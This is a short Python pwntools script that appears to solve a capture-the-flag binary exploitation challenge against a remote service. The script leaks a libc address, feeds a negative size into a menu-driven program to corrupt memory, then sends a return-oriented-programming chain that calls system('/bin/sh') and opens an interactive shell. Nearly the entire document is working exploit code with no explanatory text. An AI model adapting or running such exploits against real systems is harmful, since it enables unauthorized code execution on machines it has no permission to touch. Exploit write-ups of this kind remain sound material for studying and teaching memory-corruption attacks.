#!/usr/bin/python
from pwn import *

p = remote("185.168.131.122", 6000)
#p = process("./final")
raw_input()

def menu():
	p.recvuntil("a promotion")

def soldier(name,size,desc,fl):
	menu()
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline(name)
	p.recvuntil("height:")
	p.sendline("33")
	p.recvuntil("weight:")
	p.sendline("33")
	p.recvuntil("answer")
	p.sendline(str(size))
	if fl == 6:
		p.recvuntil("description:")
		p.sendline(desc)
	else:
		pass

def promote(reason):
	menu()
	p.sendline("3")
	p.recvuntil("answer :")
	p.sendline(reason)

p.recvuntil("Luck : ")
leak = p.recvline().strip("\n")
leak = leak + "\x00"*2
leak = u64(leak) - 0x6f690
log.success("Libc: " + hex(leak))
libc = leak

buf = "A"*8
soldier(buf,96,"BB",6)
promote("K")

pop_rdi = p64(0x0000000000400d03)
sh_str = p64(libc + 0x18cd57)
system = p64(libc + 0x45390)

soldier(buf,-2,"CC",8)
buf = "X"*56
buf += pop_rdi
buf += sh_str
buf += system
promote(buf)

p.interactive()
